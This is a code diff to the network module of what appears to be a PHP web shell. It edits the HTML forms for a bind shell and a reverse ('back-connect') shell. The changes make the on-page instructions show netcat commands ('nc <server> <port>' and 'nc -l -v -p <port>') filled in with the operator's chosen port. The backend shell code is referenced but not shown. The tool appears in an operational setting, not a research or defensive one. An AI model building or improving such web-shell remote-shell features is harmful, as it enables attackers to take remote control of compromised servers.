@@ -16,7 +16,7 @@ $GLOBALS['module']['network']['content'] = "
 </thead>
 <tbody>
 	<tr><td style='width:144px'>Server IP</td><td><input type='text' id='bindAddr' value='".$server_addr."' disabled></td></tr>
-	<tr><td>Port</td><td><input type='text' id='bindPort' value='".$default_port."' onkeydown=\"trap_enter(event, 'rs_go_bind');\"></td></tr>
+	<tr><td>Port</td><td><input type='text' id='bindPort' value='".$default_port."' onkeyup='$(\"#s_port\").html($(this).val());' onkeydown=\"trap_enter(event, 'rs_go_bind');\"></td></tr>
 </tbody>
 <tfoot>
 	<tr>
@@ -27,7 +27,7 @@ $GLOBALS['module']['network']['content'] = "
 		</td>
 		<td><span class='button' onclick=\"rs_go_bind();\" style='width:120px;'>run</span></td>
 	</tr>
-	<tr><td colspan='2'><pre id='bindResult'>Press ' run ' button and run ' nc server_ip port ' on your computer</pre></td></tr>
+	<tr><td colspan='2'><pre id='bindResult'>Press ' run ' button and run ' nc ".$server_addr." <span id='s_port'>".$default_port."</span> ' on your computer</pre></td></tr>
 </tfoot>
 </table>
 <br>
@@ -37,7 +37,7 @@ $GLOBALS['module']['network']['content'] = "
 </thead>
 <tbody>
 	<tr><td style='width:144px'>Target IP</td><td><input type='text' id='backAddr' value='".$remote_addr."' onkeydown=\"trap_enter(event, 'rs_go_back');\"></td></tr>
-	<tr><td>Port</td><td><input type='text' id='backPort' value='".$default_port."' onkeydown=\"trap_enter(event, 'rs_go_back');\"></td></tr>
+	<tr><td>Port</td><td><input type='text' id='backPort' value='".$default_port."' onkeyup='$(\"#rs_port\").html($(this).val());' onkeydown=\"trap_enter(event, 'rs_go_back');\"></td></tr>
 </tbody>
 <tfoot>
 	<tr>
@@ -48,7 +48,7 @@ $GLOBALS['module']['network']['content'] = "
 		</td>
 		<td><span class='button' onclick=\"rs_go('back');\" style='width:120px;'>run</span></td>
 	</tr>
-	<tr><td colspan='2'><pre id='backResult'>Run ' nc -l -v -p port ' on your computer and press ' run ' button</pre></td></tr>
+	<tr><td colspan='2'><pre id='backResult'>Run ' nc -l -v -p <span id='rs_port'>".$default_port."</span> ' on your computer and press ' run ' button</pre></td></tr>
 </tfoot>
 </table>
 <br>
